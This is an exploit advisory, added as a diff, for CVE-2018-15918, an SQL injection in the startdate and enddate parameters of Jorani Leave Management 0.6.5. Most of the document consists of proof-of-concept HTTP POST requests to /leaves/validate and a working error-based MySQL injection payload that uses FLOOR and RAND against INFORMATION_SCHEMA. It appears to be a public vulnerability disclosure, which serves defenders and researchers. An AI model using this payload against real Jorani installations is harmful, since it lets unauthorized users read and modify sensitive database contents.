@@ -1,0 +1,70 @@
+# Exploit Title: Jorani Leave Management 0.6.5 – 'startdate' SQL Injection
+# Exploit Author: Javier Olmedo
+# Website: https://hackpuntes.com
+# Date: 2018-09-06
+# Google Dork: N/A
+# Vendor: Benjamin BALET
+# Software Link: https://jorani.org/download.html
+# Affected Version: 0.6.5 and possibly before
+# Patched Version: unpatched
+# Category: Web Application
+# Platform: Windows
+# Tested on: Win10x64 & Kali Linux
+# CVE: 2018-15918
+# Reference:
+# https://hackpuntes.com/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection/
+# https://github.com/bbalet/jorani/issues/254
+  
+# 1. Technical Description:
+# Jorani Leave Management System 0.6.5 and possibly before are affected by SQL Injection in startdate
+# and enddate parameters through POST request in "/leaves/validate" resource.
+# This allows a user of the application without permissions to read and modify sensitive information from
+# the database used by the application.
+  
+# 2. Proof Of Concept (PoC):
+# 2.1 The following POST request generates an error 500 in the Application (add ' in startdate parameter)
+---
+POST /leaves/validate HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: */*
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/leaves/create
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 167
+Cookie: csrf_cookie_jorani=521d82ffceaee171d5ff3c5c817c3dfd; jorani_session=r8ofjpch4g93t6563t7ols6fBkeeommo;
+Connection: close
+
+csrf_cookie_jorani=521d82ffceaee171d5ff3c5c817c3dfd&id=1&type=compensate&startdate=2018-08-02'&enddate=2018-08-03
+&startdatetype=Morning&enddatetype=Afternoon&leave_id=
+---
+
+# 2.2 In another request, add two ' to receive a code 200 OK
+---
+POST /leaves/validate HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: */*
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/leaves/create
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 167
+Cookie: csrf_cookie_jorani=521d82ffceaee171d5ff3c5c817c3dfd; jorani_session=r8ofjpch4g93t6563t7ols6fBkeeommo;
+Connection: close
+
+csrf_cookie_jorani=521d82ffceaee171d5ff3c5c817c3dfd&id=1&type=compensate&startdate=2018-08-02''&enddate=2018-08-03
+&startdatetype=Morning&enddatetype=Afternoon&leave_id=
+---
+ 
+# 3. Payload:
+# Parameters: startdate and enddate (POST)
+# Type: error-based
+# Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+# Payload:
+id=1&type=compensate&startdate=2018-08-02&enddate=2018-08-03') AND (SELECT 2138 FROM (SELECT COUNT(*),CONCAT(0x7178787071,
+(SELECT (ELT(2138=2138,1))),0x716b716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND
+('WfLI'='WfLI&startdatetype=Morning&enddatetype=Afternoon&leave_id=
